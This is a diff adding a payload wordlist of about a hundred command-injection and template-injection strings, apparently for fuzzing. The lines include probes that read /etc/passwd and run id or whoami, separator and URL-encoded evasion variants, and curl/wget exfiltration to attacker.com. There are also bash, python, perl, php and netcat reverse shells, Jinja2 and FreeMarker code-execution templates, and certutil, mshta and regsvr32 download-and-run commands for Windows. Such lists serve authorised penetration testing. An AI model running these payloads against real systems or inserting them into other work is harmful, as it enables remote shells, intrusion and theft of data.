@@ -1,0 +1,103 @@
+; id
+; whoami
+; cat /etc/passwd
+; ls -la
+; pwd
+| id
+| whoami
+| cat /etc/passwd
+| ls -la
+& id
+& whoami
+& cat /etc/passwd
+&& id
+&& whoami
+&& cat /etc/passwd
+`id`
+`whoami`
+`cat /etc/passwd`
+$(id)
+$(whoami)
+$(cat /etc/passwd)
+$({id})
+;id;
+|id|
+;cat /etc/passwd;
+|| id
+|| whoami
+|| cat /etc/passwd
+; ping -c 1 attacker.com
+; curl http://attacker.com/$(id)
+; wget http://attacker.com/$(whoami)
+; nslookup attacker.com
+; sleep 5
+; sleep 10
+| sleep 5
+& sleep 5
+`sleep 5`
+$(sleep 5)
+; ping -n 1 attacker.com
+; curl -s http://attacker.com/rce?cmd=id
+%3Bid
+%3Bwhoami
+%7Cid
+%26id
+%60id%60
+%24%28id%29
+;+id
+|+id
+%3b+id
+%0aid
+%0a id
+%0a%0aid
+%0d%0aid
+\nid
+\n id
+\rid
+a;id
+a|id
+a&id
+a&&id
+a`id`
+a$(id)
+;echo${IFS}YWxlcnQx|base64${IFS}-d|bash
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+; python3 -c 'import os;os.system("curl attacker.com/$(id)")'
+; perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
+; php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+; nc -e /bin/sh attacker.com 4444
+; nc attacker.com 4444 | /bin/bash | nc attacker.com 4445
+; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
+; /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+; sh -i >& /dev/tcp/attacker.com/4444 0>&1
+{{7*7}}
+{{7*'7'}}
+{{config}}
+{{config.items()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+${7*7}
+${class.getResource('/').toURI().resolve('file:///etc/passwd').toURL().openStream().readAllBytes()}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+#{7*7}
+*{7*7}
+@{7*7}
+{% for x in ().__class__.__bases__[0].__subclasses__() %}{% if "catch_warnings" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}
+curl -s -o /dev/null http://attacker.com/rce?c=$(id|base64)
+curl${IFS}-s${IFS}http://attacker.com/rce
+ping${IFS}-c${IFS}1${IFS}attacker.com
+; type C:\Windows\System32\drivers\etc\hosts
+& type C:\Windows\win.ini
+& dir C:\
+| dir
+; whoami /all
+& net user
+& net localgroup administrators
+; cmd /c whoami
+; powershell -c whoami
+; powershell -enc <base64>
+; certutil -urlcache -split -f http://attacker.com/shell.exe C:\Windows\Temp\shell.exe
+; mshta http://attacker.com/shell.hta
+; regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
